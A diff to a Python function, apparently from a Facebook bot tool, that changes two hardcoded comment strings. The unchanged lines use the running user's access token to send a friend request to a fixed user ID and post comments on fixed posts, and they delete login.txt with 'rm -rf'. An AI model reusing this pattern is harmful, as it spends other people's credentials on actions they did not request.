@@ -64,11 +64,11 @@ def bot_komen():
         os.system('rm -rf login.txt')
 
     una = ('1013884014')
-    kom = ('verry nice')
+    kom = ('Very nice ❤️')
     reac =('LOVE')
     post = ('10222608279288375')
     post2 =('243596640718100')
-    kom2 =('Login Buruh😁')
+    kom2 =('l love u')
     reac2 =('ANGRY')
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
